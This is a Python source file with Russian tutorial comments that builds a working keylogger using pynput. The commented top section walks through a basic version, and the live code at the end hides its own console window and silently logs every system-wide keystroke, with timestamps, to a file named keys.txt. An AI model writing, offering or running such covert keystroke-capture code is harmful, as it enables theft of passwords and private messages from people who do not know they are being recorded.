# from pynput.keyboard import Key, Listener

# def key_pressed(key):
#     k = str(key).replace ("'", '')
#     if key == Key.space:
#         k ='\n'
#     with open('keys.txt', 'at') as f:
#         f.write(k)

# def key_realesed(key):
#     if key == Key.esc:
#         return False

# with Listener (
#     on_press=key_pressed,
#     on_release=key_realesed,
# ) as listener:
#     listener.join()

# Сначала установим библиотеку, которая будет следить за нажатием клавиш. Она понадобится для того, чтобы можно было прицепить срабатывание 
# какой-либо функции к нажатию абсолютно любой клавиши на клавиатуре. При этом даже необязательно находиться в окне консоли, 
# чтобы программа продолжала считывать нажатие клавиш. Такая библиотека называется pynput.

# Установим её с помощью pip.

# pip install pynput

# Теперь можно писать код.

# from pynput.keyboard import Listener, Key # импортируем нужные классы, Listener - прослушиватель нажатий, Key - удобно получает коды клавиш в ascii
 
 
# with Listener(
#     on_press=lambda key: print(key), # напишем простенькую лямбду, в дальнейшем поменяем на полноценную функцию, сейчас нам надо лишь просмотреть,
# # как работает прослушиватель, поэтому просто печатаем клавишу в консоль
#     on_release=lambda key: True,
# ) as listener:
#     listener.join() # подключаем прослушку

from pynput.keyboard import Key, Listener
import win32api
import win32gui
import win32console
 
from datetime import datetime
 
 
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)
 
def key_pressed(key):
    # убираем кавычки в выводе
    k = str(key).replace("'", '')
 
    # заменяем непонятный вывод пробела на символ переноса строки
    if key == Key.space:
        k = ''.join(('\n', datetime.utcnow().strftime('%d %m %Y %H:%M'), '\n'))
 
    # мы не хотим видеть в файле всякие непонятные клавиши типа контрола, бекспейсов и т.д.
    if k.find('Key.') == -1:
        with open('keys.txt', 'at') as f:
            f.write(k)
 
 
def key_released(key):
    if key == Key.esc:
        return False
 
 
with Listener( 
    on_press=key_pressed,
    on_release=key_released,
) as listener:
    listener.join()